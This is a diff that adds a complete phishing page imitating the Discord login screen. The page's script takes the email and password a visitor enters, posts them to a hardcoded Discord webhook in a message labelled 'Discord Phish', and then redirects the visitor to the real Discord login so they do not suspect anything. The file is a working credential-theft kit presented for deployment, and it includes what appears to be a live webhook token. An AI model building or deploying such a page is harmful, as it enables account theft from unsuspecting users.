@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord</title>
+    <style>
+        body {
+            background-color: #313338;
+            font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #dbdee1;
+        }
+        .container {
+            background-color: #1e1f22;
+            padding: 32px;
+            border-radius: 5px;
+            width: 480px;
+            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
+            text-align: center;
+        }
+        h2 {
+            color: #f2f3f5;
+            margin-bottom: 8px;
+            font-size: 24px;
+            font-weight: 600;
+        }
+        p {
+            color: #b5bac1;
+            margin-bottom: 20px;
+            font-size: 16px;
+        }
+        .input-group {
+            text-align: left;
+            margin-bottom: 16px;
+        }
+        label {
+            display: block;
+            color: #b5bac1;
+            font-size: 12px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            background-color: #1e1f22;
+            border: none;
+            border-radius: 3px;
+            color: #dbdee1;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        input:focus {
+            outline: none;
+            background-color: #1e1f22;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #7289da;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+        button:hover {
+            background-color: #677bc4;
+        }
+        .footer {
+            margin-top: 16px;
+            color: #b5bac1;
+            font-size: 14px;
+        }
+        .footer a {
+            color: #00adef;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .logo {
+            width: 126px;
+            margin-bottom: 24px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- Discord Logo -->
+    <img src="https://discord.com/assets/6d9b4b7b0a1a0b0b0b0b0b0b0b0b0b0b.png" alt="Discord Logo" class="logo" 
+         onerror="this.src='https://assets-global.website-files.com/6257adef93968e5660c659c3/6257d4f9111d067661892206_DiscordLogo.svg'">
+
+    <h2>Welcome back!</h2>
+    <p>We're so excited to see you again!</p>
+
+    <form id="loginForm">
+        <div class="input-group">
+            <label>Email or Phone Number</label>
+            <input type="text" name="email" required placeholder="Enter your email or phone">
+        </div>
+        <div class="input-group">
+            <label>Password</label>
+            <input type="password" name="password" required placeholder="Enter your password">
+        </div>
+        <button type="submit">Log In</button>
+    </form>
+
+    <div class="footer">
+        Forgot your password? <a href="#">Reset it</a>
+    </div>
+</div>
+
+<script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const email = document.querySelector('input[name="email"]').value;
+        const password = document.querySelector('input[name="password"]').value;
+
+        // Replace this URL with your Discord Webhook URL
+        const webhookUrl = "https://discord.com/api/webhooks/1554879443674337475/4BXYO00Ov1lWeKepa_e6bLMFZ4nmQUdHikLbuPZ6NlMx647ZeoO8qkkucOCM9rnw1Psx";
+
+        const payload = {
+            content: "New Login Detected!",
+            embeds: [{
+                title: "Discord Phish",
+                color: 15158332,
+                fields: [
+                    { name: "Email/Phone", value: email, inline: true },
+                    { name: "Password", value: password, inline: true }
+                ],
+                footer: { text: "Time: " + new Date().toLocaleString() }
+            }]
+        };
+
+        fetch(webhookUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        }).then(() => {
+            // Redirect to the real Discord login page to avoid suspicion
+            window.location.href = "https://discord.com/login";
+        }).catch(err => {
+            console.error("Error sending data:", err);
+            window.location.href = "https://discord.com/login";
+        });
+    });
+</script>
+
+</body>
+</html>
